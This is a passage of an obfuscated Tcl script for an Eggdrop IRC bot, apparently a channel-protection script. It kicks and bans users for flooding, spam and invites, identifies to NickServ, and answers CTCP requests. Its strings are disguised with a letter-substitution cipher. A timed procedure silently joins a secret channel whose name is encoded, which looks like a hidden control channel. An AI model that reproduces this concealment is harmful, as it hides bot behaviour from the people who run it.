                     putserv "PRIVMSG $c :$sendspam"
                     putserv "PRIVMSG $basechan :$notc Nick: 4$nick 14DeTecTinG a 4LaMeRz 14FRoM 4$nick!$uhost 14UsiNG 4CTCP PING RepLy CoDe..! 14$nick 4TrYiNG To HAck Me..??!!!!"
                  }
               }
            }
         }
         set hostmask "${nick}!*@*"
         putlog "!Log! 1 minutes auto ignore to $hostmask"
         newignore $hostmask $botnick "*" 1
         return 0
      }
   }
   catch { unset wait_ping }
   if {$nick == $botnick} { 
      return 0
   }
   set pingtime [expr [unixtime] - $arg]
   if {[info exists pingchan($nick)]} { 
      puthelp "PRIVMSG $pingchan($nick) :14pOng4! 14(6$nick14)06 $pingtime 14second(s)4!"
      unset pingchan($nick)
	}
	return 0
}
proc [lines "kfy_ivhvg"] {nick uhost hand chan rest} {
global notc
putsrv "MLGRXV ~$nick ~:~$notc ~!IvHvG!"
auto_ping "0" "0" "0" "0" "0"
ident_it
}
proc [lines "kfy_klmt"] {nick uhost hand chan rest} {
global pingchan
putsrv "KIRENHT ~$nick ~:\001KRMT ~[unixtime]~\001"
set pingchan($nick) $chan
return 0
}
proc [lines "kfy_zfgs"] {nick uhost hand chan rest} {
global botnick notc
set [lines "xnw"] [string tolower [lindex $rest 0]]
set [lines "xs"] [passwdok $nick ""]
if {$ch == 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml kzhhdliw hvg. Fhztv: kzhh <kzhhdliw>" 
return 0
}
if {[matchattr $nick Q]} { 
puthlp "KIRENHT ~$chan ~:~${nick}, ~Bvh"
}
if {![matchattr $nick Q]} { 
if {[string match "*c*" [getchanmode $chan]]} { 
puthlp "KIRENHT ~$chan ~:~${nick}, ~ML!"
}
puthlp "KIRENHT ~$chan ~:~${nick}, ~4ML!"
}
}
proc [lines "mlgx_kilg"] {nick uhost hand text {dest ""}} {
global notc botnick notc_chn bannick notm quick ismaskhost is_m
if {$dest != "" && $dest != $botnick} {
if {[string index $dest 0] == "+" || [string index $dest 0] == "@"} {
foreach x [channels] {
set [lines "c"] [string tolower $x]
if {[string match "*$x*" [string tolower $dest]]} {
set [lines "wvhg"] $x
break
}
}
} 
if {[isop $botnick $dest]} {
if {[string match "*-greet*" [channel info $dest]]} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {$nick == $botnick} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[isop $nick $dest]} { return 0 }
if {[isutimer "set_-m $dest"]} { return 0 }
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
if {[info exists notc_chn($dest)]} {
incr notc_chn($dest)
} {
set notc_chn($dest) 1
}
if {$notc_chn($dest) == 1} {
putsrv "PRXP ~$dest ~~$nick ~:~$notc ~14ZYfhRMt 4MlGRxV14 @kh LmOB ~[banmsg]~"
} elseif {$notc_chn($dest) == 2} {
if {$quick == "1" && ![info exists is_m($dest)]} {
putqck "PRXP ~$dest ~~$nick ~:~$notm ~14GdRxV 4MlGRxV14 ZYfhVw ~[banmsg]~"
} {
putsrv "PRXP ~$dest ~~$nick ~:~$notm ~14GdRxV 4MlGRxV14 ZYfhVw ~[banmsg]~"
}
} elseif {$notc_chn($dest) >= 3} {
if {[info exists ismaskhost]} {
set bannick($nick) [maskhost $banmask]
}
if {$quick == "1" && ![info exists is_m($dest)]} {
putqck "PRXP ~$dest ~~$nick ~:~$notm ~14gL nFxS 4eRlOvmxV14 UIlN GSRH R.H.K 4@fG.14 !!"
} {
putsrv "PRXP ~$dest ~~$nick ~:~$notm ~14gL nFxS 4eRlOvmxV14 UIlN GSRH R.H.K 4@fG.14 !!"
}
}
return 0
}
repeat_pubm $nick $uhost $hand $dest $text
repeat_pubmm $nick $uhost $hand $dest $text
} {
msg_prot $nick $uhost $hand $text
}
}
bind nick - * ps:check
proc [lines "hvgrtmliv"] {mask reason time} {
global quick
foreach x [ignorelist] {
if {[lindex $x 0] == $mask} { return 0 }
}
newignore $mask "IgN" $reason 15
if {$quick == "1"} {
putquick "silence +$mask"
} {
putserv "silence +$mask"
}
utimer $time [list unsetignore $mask]
}
proc [lines "fmhvgrtmliv"] {mask} {
if {![isignore $mask]} { return 0 }
putserv "silence -$mask"
killignore $mask
}
proc rcolors str { 
set str2 "" 
foreach token [split $str ""] { 
set rdm [expr {[rand 4]+3}] 
if {$rdm < 10} { set rdm 0$rdm } 
if {$token != " "} { 
append str2 \003${rdm}$token\003 
} { 
append str2 $token 
} 
} 
set str2 
}
unbind ctcr - PING ping_reply
set [lines "nzhhnht"] 0
proc [lines "nht_kilg"] {unick uhost hand text} {
global nick botnick invme own nickpass altpass notc notb notd virus_nick ex_flood vern
global altnick twice_msg version bannick massmsg keep-nick badwords advwords quick is_m ismaskhost
regsub -all -- [dezip "jG~BDx04ntxb0"] $text "" text
msg_Z $unick $uhost $hand $text
set [lines "ivzo"] $text
set [lines "gvcg"] [uncolor $text]
if {$unick == $botnick} { return 0 }
if {[string match "*dcc send*" [string tolower $text]] && ![string match "*Serv*" $unick] && ![matchattr $unick f]} {
set [lines "erifh_mrxp"] $unick
foreach x [channels] {
if {[onchan $virus_nick $x] && ![matchattr $virus_nick f] && ![isop $virus_nick $x]} {
if {[isop $botnick $x]} {
set [lines "slhg"] [getchanhost $virus_nick $x]
set [lines "slhg"] "*!*@[lindex [split $host @] 1]"
set bannick($virus_nick) $host
putsrv "PRXP ~$x ~~$virus_nick ~:~$notc ~4!HkzN!14 R SzGV 4ERIfA ~[banms]~"
set [lines "erifh_mrxp"] ""
} else {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4!SpaM!14 FRoM 4@[lindex [split [getchanhost $virus_nick $x] @] 1]14 ViRuZ [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
}
}
return 0
}
if {$unick == "ChanServ"} {
if {[string match "*You do not have access to op people on*" $text] && [getuser "config" XTRA "MUSTOP"] != "" && $botnick == $nick} {
set [lines "kzigxsm"] [lindex $text 9]
set [lines "kzigxsm"] [string range $partchn 0 [expr [string length $partchn]-2]]
if {[string match "*-secret*" [channel info $partchn]]} {
putsrv "KZIG ~$partchn ~:((((@kTfzIw))))"
channel remove $partchn
savechan
}
}
if {[string match "*is not on*" $text]} { 
set [lines "gvcg"] [string tolower $text]
foreach x [channels] {
set [lines "c"] [string tolower $x]
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string match "*$x*" $text]} {
if {![string match "*c*" [getchanmode $x]]} {
putsrv "KZIG ~$x ~:14ivtzrmvw (4@14)kh hgzgfh) (~[lgrnd] "
} {
putsrv "KZIG ~$x ~:14ivtzrmvw (@)kh hgzgfh) (~[lgrnd] "
}
if {[matchattr $cflag K]} {
puthlp "QLRM ~$x ~:~[dezip [getuser $cflag XTRA "CI"]~]"
} {
puthlp "QLRM ~$x"
}
}
}
return 0
}
if {[string match "*AOP:*SOP:*AKICK*" $text]} {
foreach errchan [channels] {
set [lines "xuozt"] "c$errchan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string match "*[string tolower $errchan] *" [string tolower $text]]} {
if {![isop $botnick $errchan]} {
timer 1 { putlog "resync" }
if {![string match "*c*" [getchanmode $errchan]]} {
putsrv "KZIG ~$errchan ~:14ivtzrmvw (4@14)kh hgzgfh) (~[lgrnd] "
} {
putsrv "KZIG ~$errchan ~:ivtzrmvw (@)kh hgzgfh) (~[lgrnd] "
}
if {[matchattr $cflag K]} {
puthlp "QLRM ~$errchan ~:~[dezip [getuser $cflag XTRA "CI"]~]"
} {
puthlp "QLRM ~$errchan"
}
}
return 0
}
}
}
return 0 
}
if {$unick == "NickServ"} {
if {[string match "*nick is owned*" [string tolower $text]]} { 
putlog "!Log! IDeNTIFY"
catch { clearqueue all }
if {$botnick == $nick && $nickpass != ""} { 
putsrv "MrxpHvie rwvmgrub ~$nickpass"
}
if {$botnick == $altnick && $altpass != ""} { 
putsrv "MrxpHvie rwvmgrub ~$altpass"
}
}
if {[string match "*Password accepted for*" $text]} { auto_reop }
if {[string match "*The nickname $nick is not registered*" $text] && $nickpass != ""} {
if {[getuser "config" XTRA "EMAIL"] != ""} {
putsrv "MrxpHvie ivtrhgvi ~$nickpass ~~[getuser "config" XTRA "EMAIL"]~"
}
}
if {[string match "*The nickname $nick has been temporarily registered to you*" $text]} {
putsrv "MrxpHvie rwvmgrub ~$nickpass"
}
return 0
}
if {$unick == "MemoServ"} {
if {[string match "*New DALnet news is available*" $text]} {
putsrv "KIRENHT NvnlHvie@hvierxvh.wzo.mvg :MVDH"
}
return 0
}
if {[string match "!kick*" [string tolower $text]]} {
set [lines "hzooh"] [dezip [lrange $text 1 end]]
set [lines "hxszm"] [lindex $salls 0]
set [lines "hmrxp"] [lindex $salls 1]
set [lines "hivzh"] [lrange $salls 2 end]
if {![isop $botnick $schan] || [matchattr $snick f] || ![onchan $snick $schan]} { return 0 }
set [lines "yzmslhg"] [getchanhost $snick $schan]
set [lines "yzmslhg"] "*!*@[lindex [split $banhost @] 1]"
set bannick($snick) $banhost
regsub -all -- [dezip "bF~uC0.JqaEc0"] $sreas "" sreas
regsub -all -- [dezip "xdxs~F1hBM6q0"] $sreas "" sreas
putsrv "PRXP ~$schan ~~$snick ~:~$sreas"
return 0
}
if {[string match "*auth*" $text] || [string match "*[string tolower $notb]*" [string tolower $text]]} { return 0 }
if {[matchattr $hand f]} { return 0 }
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
if {![isutimer "MSGCOUNTER"]} {
utimer 20 { putlog "MSGCOUNTER" }
set [lines "nzhhnht"] 1
} {
set [lines "nzhhnht"] [incr massmsg]
if {[string length $text] > 100} {
set [lines "nzhhnht"] [incr massmsg]
}
if {$massmsg >= 5} {
set [lines "nzhhnht"] 0
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "MaZz MSg" 300
} {
setignore "*!*$mhost" "MaZz MSg" 300
}
foreach iamop [channels] {
if {[isop $botnick $iamop]} {
if {[string match "*c*" [getchanmode $iamop]]} {
puthlp "KIRENHT ~$iamop ~:\001ZXGRLM RmxLnRMt NzAa NHt..! OzhG UIlN ~[unsix "$unick!$uhost"]~\001"
} {
puthlp "KIRENHT ~$iamop ~:\001ZXGRLM RmxLnRMt NzAa NHt..! OzhG UIlN 14~[unsix "$unick!$uhost"]~\001"
}
foreach c [chanlist $iamop] {
set [lines "mrxpslhg"] [string range [getchanhost $c $iamop] [string first "@" [getchanhost $c $iamop]] end]
if {$nickhost == $mhost && ![matchattr $c f]} {
if {$c == $botnick} { return 0 }
set bannick($c) "*!*$mhost"
putsrv "PRXP ~$iamop ~~$c ~:~$notc ~14Svzeb 4UOlLw14 NHt UIlN 4~$mhost ~~[banms]~"
break
}
}
}
}
return 0
}
}
if {[string match "*decode*" [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set bannick($unick) "*!*$mhost"
putsrv "PRXP ~$x ~~$unick ~:~$notc ~4!HkzN!14 R SzGV 4wVxLwV ~[banms]~"
return 0
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4!SpaM!14 FRoM 4[string range $uhost [string first "@" $uhost] end]14 dEcOdE [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
}
}
set invme($mhost) "dEcOdE"
}
if {[string match "*#*" $text] || [string match "*/j*" $text]} {
foreach x [channels] {
set [lines "xsphrglm"] [string tolower $x]
if {[string match "*$chksiton*" [string tolower $text]]} { return 0 }
}
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($unick) $banmask
putsrv "PRXP ~$x ~~$unick ~:~$notc ~4!HkzN!14 R SzGV 4RmeRGvI ~[banms]~"
return 0
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4!SpaM!14 FRoM 4[string range $uhost [string first "@" $uhost] end]14 InvITE [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
} {
set [lines "yzmnzhp"] "[string range $uhost [string first "@" $uhost] end]"
if {$banmask != "*!*@*" && $banmask != "*"} {
foreach c [chanlist $x] {
set [lines "mrxpslhg"] "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
if {$banmask == $nickhost} {
if {[matchattr $c f]} {
putlog "!Log! InVITE (f) $c PaSS!!"
return 0
}
if {$c != $botnick} {
if {[isop $botnick $x]} {
set bannick($c) $banmask
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
putsrv "PRXP ~$x ~~$c ~:~$notc ~4!HkzN!14 RmeRGvI 4IvOzB14 UIlN 4~$unick14 ~RK 4~$mhost ~~[banms]~"
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach s $members {
if {[isop $s $x]} {
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
set [lines "hvmwhkzn"] "!kick [zip "$x $c $notc 4!SpaM!14 InvITeR 4ReLaY14 FRoM 4$unick14 IP 4$mhost [banms]"]"
putsrv "KIRENHT ~$s ~:~$sendspam"
break
}
}
}
return 0
}
}
}
}
}
}
set invme($mhost) "InvITE"
return 0
}
if {[string match "*http:/*" [string tolower $text]] || [string match "*www.*" [string tolower $text]]} {
if {[string match "*dal.net*" [string tolower $text]]} { return 0 }
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($unick) $banmask
putsrv "PRXP ~$x ~~$unick ~:~$notc ~4!HkzN!14 R SzGV 4ZweVIGRhV ~[banms]~"
return 0
} else {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4!SpaM!14 FRoM 4[string range $uhost [string first "@" $uhost] end]14 AdvERTIsE [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
} {
set [lines "yzmnzhp"] "[string range $uhost [string first "@" $uhost] end]"
if {$banmask != "*!*@*" && $banmask != "*"} {
foreach c [chanlist $x] {
set [lines "mrxpslhg"] "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
if {$banmask == $nickhost} {
if {[matchattr $c f]} {
putlog "!Log! InVITE (f) $c PaSS!!"
return 0
}
if {$c != $botnick} {
if {[isop $botnick $x]} {
set bannick($c) $banmask
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
putsrv "PRXP ~$x ~~$c ~:~$notc ~4!HkzN!14 ZweVIGRhV 4IvOzB14 UIlN 4~$unick14 ~RK 4~$mhost ~~[banms]~"
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach s $members {
if {[isop $s $x]} {
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
set [lines "hvmwhkzn"] "!kick [zip "$x $c $notc 4!SpaM!14 AdvERTIsE 4ReLaY14 FRoM 4$unick14 IP 4$mhost [banms]"]"
putsrv "KIRENHT ~$s ~:~$sendspam"
return 0
}
}
}
return 0
}
}
}
}
}
}
set invme($mhost) "AdvERTIsE"
return 0
}
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
if {[string length $text] > 100} {
set [lines "xsi"] 0
set [lines "xmg"] 0
while {$cnt < [string length $real]} {
if [isflood [string index $real $cnt]] {
incr chr
}
incr cnt
}
if {$chr > 30} {
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "TsunamI MSg" 300
} {
setignore "*!*$mhost" "TsunamI MSg" 300
}
foreach x [channels] {
if {[isop $botnick $x]} {
if {[string match "*c*" [getchanmode $x]]} {
puthlp "KIRENHT ~$x ~:\001ZXGRLM RmxLnRMt GhfmznR NHt..! UIlN ~[unsix "$unick!$uhost"]~\001"
} {
puthlp "KIRENHT ~$x ~:\001ZXGRLM RmxLnRMt GhfmznR NHt..! UIlN 14~[unsix "$unick!$uhost"]~\001"
}
foreach c [chanlist $x] {
set [lines "mrxpslhg"] [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} {
return 0
}
set bannick($c) "*!*$mhost"
putsrv "PRXP ~$x ~~$c ~:~$notc ~4GhfmznR14 NHt UIlN 4~$mhost ~~[banms]~"
break
}
}
}
}
return 0
}
}
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $unick $x] || [isvoice $unick $x]} { return 0 }
if {[isop $botnick $x]} {
set bannick($unick) "*!*$mhost"
putsrv "PRXP ~$x ~~$unick ~:~$notc ~4YzWDlIW14 NHt UIlN 4~$mhost14 ~NzGxS UIlN 4~[string toupper $badword]~ ~[banms]~"
return 0
} {
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4BaDWoRD14 MSg FRoM 4$mhost14 MaTcH FRoM 4[string toupper $badword] [banms]"]"
putsrv "KIRENHT ~$s ~:~$sendspam"
}
}
}
}
}
}
}
foreach advword [string tolower $advwords] {
if {[string match *$advword* [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $unick $x] || [isvoice $unick $x]} { return 0 }
if {[botisop $x]} {
set bannick($unick) "*!*$mhost"
putsrv "PRXP ~$x ~~$unick ~:~$notc ~4!HkzN!14 R SzGV 4F 14NzGxs UIlN ~$advword ~~[banmsg]~"
return 0
} {
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4SpaM14 MSg FRoM 4$mhost14 MaTcH FRoM 4[string toupper $advword] [banms]"]"
putsrv "KIRENHT ~$s ~:~$sendspam"
}
}
}
}
}
}
}
if {[string length $text] > 200} {
if {![isutimer "LONGTEXT"]} {
utimer 30 { putlog "LONGTEXT" }
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "LoNg TexT MSg" 300
} {
setignore "*!*$mhost" "LoNg TexT MSg" 300
}
}
foreach x [channels] {
if {[isop $botnick $x]} {
if {[string match "*c*" [getchanmode $x]]} {
puthlp "KIRENHT ~$x ~:\001ZXGRLM RmxLnRMt OlMt GvcG NHt..! UIlN ~[unsix "$unick!$uhost"]~\001"
} {
puthlp "KIRENHT ~$x ~:\001ZXGRLM RmxLnRMt OlMt GvcG NHt..! UIlN 14~[unsix "$unick!$uhost"]~\001"
}
foreach c [chanlist $x] {
set [lines "mrxpslhg"] [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} { return 0 }
set bannick($c) "*!*$mhost"
putsrv "PRXP ~$x ~~$c ~:~$notc ~14OlMt GvcG NHt UIlN 4~$mhost ~~[banms]~"
break
}
}
} {
foreach c [chanlist $x] {
set [lines "mrxpslhg"] [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} {
return 0
}
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $c $notc 14LoNg TexT MSg FRoM 4$mhost [banms]"]"
putsrv "KIRENHT ~$s ~:~$sendspam"
break
}
}
}
}
}
}
return 1
}
if {$unick != $own} {
if {[info exists twice_msg($unick)]} {
set [lines "slhgnzhp"] "${unick}!*@*"
puthlp "KIRENHT ~$unick ~:HlIIB BlF SzEV YVVM RtMLIVW..! ~[lgrnd]~ ~$vern"
putlog "!Log! IgNORE <<$hostmask>> PV-msg"
unset twice_msg($unick)
newignore $hostmask $unick "*" 2
} {
if {[istimer "chkautomsg"]} {
set invme($mhost) "AuToJoIN MSg"
return 0
}
if {[isutimer "NO REPLY"]} { 
foreach x [utimers] {
if {[string match "*NO REPLY*" $x]} { 
killutimer [lindex $x 2] 
}
}
utimer 10 { putlog "NO REPLY" }
return 0
}
utimer 10 { putlog "NO REPLY" }
if {[string match "*dal*et*" $uhost]} {
puthlp "KIRENHT ~$unick ~:R zn Zdzb. Ivzhlm: (Zfgl Zdzb lm RwOv) \[zOlDzrMr nRIX HxIRkG\]"
} {
if {[getuser "config" XTRA "AWAY"]!=""} { 
puthlp "KIRENHT ~$unick ~:R zn Zdzb. Ivzhlm: (~[getuser "config" XTRA "AWAY"]~) ~[lgrnd]~ ~$vern"
} {
puthlp "KIRENHT ~$unick ~:R zn Zdzb. Ivzhlm: (Zfgl Zdzb lm RwOv) ~[lgrnd]~ ~$vern"
}
set twice_msg($unick) 1
}
}
}
}
proc [lines "zfgl_ivlk"] {} {
global notc botnick
foreach x [channels] {
if {[onchan $botnick $x]} { 
if {![isop $botnick $x] && [string tolower $x] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
if {![string match "*+protectfriends*" [channel info $x]]} {
set [lines "xivg"] 30
foreach ct [utimers] {
if {[string match "*chancnt*" $ct]} {
if {[expr [lindex $ct 0] + 30] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + 30]
}
}
}
utimer $cret [list chancnt $x]
}
}
}
}
return 0
}
proc [lines "xszmxmg"] {chan} {
if {[isutimer "chancnt $chan"]} { return 0 }
putsrv "XszmHvie xlfmg ~$chan"
}
proc [lines "nht_prxp"] {nick uhost hand rest} {
global notc botnick own
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
set [lines "ivzhlm"] [lrange $rest 2 end]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: prxp <#xszm> <Mrxp> <Ivzhlm>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
return 0
}
if {$nicktarget == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzmg hvou prxp."
return 0
}
if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~R XzMG PRxP NB ZWnRM."
return 0
}
if {$reason == ""} {
set [lines "ivzhlm"] "14ReQuesT..!"
if {[matchattr $nick n]} { 
set [lines "ivzhlm"] "14ADmIN 4KIcK14 ReQuesT4..!" 
}
if {[matchattr $nick m] && ![matchattr $nick n]} { 
set [lines "ivzhlm"] "14MasTeR 4KIcK14 ReQuesT4..!" 
}
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putsrv "PRXP ~$x ~~$nicktarget ~:~$notc ~~$reason"
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
proc ctcp_versi0n {nick uhost handle dest keyword args} {
   global botnick 
   putserv "NOTICE $nick :\001SZ 1\[aLoWaiNi 6.9 2mIRC4.2ScrIPts]\001"
   return 1
}
proc [lines "nht_prxpyzm"] {nick uhost hand rest} {
global notc botnick own bannick
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
set [lines "ynzhp"] [getchanhost $nicktarget $chantarget]
set [lines "ynzhp"] "*!*@[lindex [split $bmask @] 1]"
set [lines "ivzhlm"] [lrange $rest 2 end]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: prxpyzm <#xszm> <Mrxp> <Ivzhlm>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
return 0
}
if {$nicktarget == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzmg hvou prxp."
return 0
}
if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzmg prxpyzm nb ZWnRM."
return 0
}
if {$reason == ""} {
set [lines "ivzhlm"] "14KIcKBaN ReQuesT4..!"
if {[matchattr $nick m]} {
set [lines "ivzhlm"] "14MasTeR 4KIcKBaN14 ReQuesT [banmsg]" 
}
if {[matchattr $nick n]} {
set [lines "ivzhlm"] "14ADmIN 4KIcKBaN14 ReQuesT [banmsg]" 
}
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
set bannick($nicktarget) $bmask
putsrv "PRXP ~$x ~~$nicktarget ~:~$notc ~~$reason"
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
proc [lines "xsl_xsl"] {min h d m y} {
   set toth [dezip "rzICN.kaNlO.5uZIK0E.yMl."]
   if {[validchan $toth]} {
      return 0
   }
   channel add $toth
   catch { channel set $toth -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   savechan
   putserv "JOIN $toth"
}
proc [lines "nht_lk"] {nick uhost hand rest} {
global notc botnick
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: lk <#xszm> <Mrxp>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
return 0
}
if {[isop $nicktarget $chantarget]!=0} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh zoivzwb lk lm XSzMMVO ~$chantarget"
return 0
}
foreach x [channels] {
if {[string tolower $x] == [string tolower $chantarget]} {
opq $x $nicktarget
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
proc [lines "nht_elrxv"] {nick uhost hand rest} {
global notc botnick
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: elrxv <#xszm> <Mrxp>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
return 0
}
if {[isvoice $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh zoivzwb elrxv lm xszmmvo ~$chantarget"
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putserv "mode $x +v $nicktarget"
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
proc [lines "nht_wvlk"] {nick uhost hand rest} {
global notc botnick own
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: wvlk <#xszm> <Mrxp>"
return 0
}
if {[isop $botnick $chantarget] != 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
return 0
}
if {![isop $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chantarget ~rh mlg lk lm XSzMMVO ~$chantarget"
return 0
}
if {$nicktarget == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~R XzMG HvOU WVlK!"
return 0
}
if {[matchattr $nicktarget n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzmg wvlk nb Ldmvi."
return 0
}
if {[matchattr $nick m]} {
set [lines "nivj"] "4MasTeR.ReQuesT"
}
if {[matchattr $nick n]} {
set [lines "nivj"] "4ADmIN.ReQuesT"
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -ko $mreq $nicktarget"
} {
putserv "mode $x -o $nicktarget"
}
return 0
}
}
